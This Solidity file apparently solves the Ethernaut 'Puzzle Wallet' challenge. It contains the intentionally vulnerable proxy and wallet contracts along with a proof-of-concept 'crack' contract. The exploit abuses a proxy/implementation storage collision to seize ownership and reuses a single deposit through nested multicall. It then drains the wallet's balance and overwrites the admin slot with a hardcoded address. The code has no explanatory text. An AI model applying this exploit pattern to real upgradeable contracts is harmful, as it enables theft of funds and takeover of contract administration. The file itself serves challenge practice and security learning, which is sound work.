// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
pragma experimental ABIEncoderV2;

import "./helpers/UpgradeableProxy-08.sol";
import "hardhat/console.sol";

contract PuzzleProxy is UpgradeableProxy {
    address public pendingAdmin;
    address public admin;

    constructor(
        address _admin,
        address _implementation,
        bytes memory _initData
    ) UpgradeableProxy(_implementation, _initData) {
        admin = _admin;
    }

    modifier onlyAdmin() {
        require(msg.sender == admin, "Caller is not the admin");
        _;
    }

    function proposeNewAdmin(address _newAdmin) external {
        pendingAdmin = _newAdmin;
    }

    function approveNewAdmin(address _expectedAdmin) external onlyAdmin {
        require(
            pendingAdmin == _expectedAdmin,
            "Expected new admin by the current admin is not the pending admin"
        );
        admin = pendingAdmin;
    }

    function upgradeTo(address _newImplementation) external onlyAdmin {
        _upgradeTo(_newImplementation);
    }
}

contract PuzzleWallet {
    address public owner;
    uint256 public maxBalance;
    mapping(address => bool) public whitelisted;
    mapping(address => uint256) public balances;

    function init(uint256 _maxBalance) public {
        require(maxBalance == 0, "Already initialized");
        maxBalance = _maxBalance;
        owner = msg.sender;
    }

    modifier onlyWhitelisted() {
        require(whitelisted[msg.sender], "Not whitelisted");
        _;
    }

    function setMaxBalance(uint256 _maxBalance) external onlyWhitelisted {
        require(address(this).balance == 0, "Contract balance is not 0");
        maxBalance = _maxBalance;
    }

    function addToWhitelist(address addr) external {
        require(msg.sender == owner, "Not the owner");
        whitelisted[addr] = true;
    }

    function deposit() external payable onlyWhitelisted {
        require(address(this).balance <= maxBalance, "Max balance reached");
        balances[msg.sender] += msg.value;
    }

    function execute(
        address to,
        uint256 value,
        bytes calldata data
    ) external payable onlyWhitelisted {
        require(balances[msg.sender] >= value, "Insufficient balance");
        balances[msg.sender] -= value;
        (bool success, ) = to.call{value: value}(data);
        require(success, "Execution failed");
    }

    function multicall(bytes[] calldata data) external payable onlyWhitelisted {
        bool depositCalled = false;
        for (uint256 i = 0; i < data.length; i++) {
            bytes memory _data = data[i];
            bytes4 selector;
            assembly {
                selector := mload(add(_data, 32))
            }
            if (selector == this.deposit.selector) {
                require(!depositCalled, "Deposit can only be called once");
                // Protect against reusing msg.value
                depositCalled = true;
            }
            (bool success, ) = address(this).delegatecall(data[i]);
            require(success, "Error while delegating call");
        }
    }
}

contract PuzzleWalletPOC {
    // 0x9d51d9b7000000000000000000000000dadada681e6270e1d0181442220a2e5608b11d21
    // 0xd0e30db0
    function crack(
        address w,
        bytes memory setMaxBalance,
        bytes memory deposit
    ) public payable {
        require(msg.value == 0.001 ether, "Not enough ETH");
        PuzzleWallet pw = PuzzleWallet(w);
        PuzzleProxy pp = PuzzleProxy(payable(w));
        pp.proposeNewAdmin(address(this));
        pw.addToWhitelist(address(this));
        pw.addToWhitelist(w);

        bytes[] memory depositCalls = new bytes[](2);
        depositCalls[0] = deposit;
        depositCalls[1] = deposit;
        pw.multicall{value: 0.001 ether}(depositCalls);
        pw.execute(msg.sender, address(pw).balance, "");

        bytes[] memory calls = new bytes[](1);
        calls[0] = setMaxBalance;
        pw.multicall(calls);
        assert(pp.admin() == 0xDadada681e6270E1D0181442220A2e5608B11d21);
    }
}
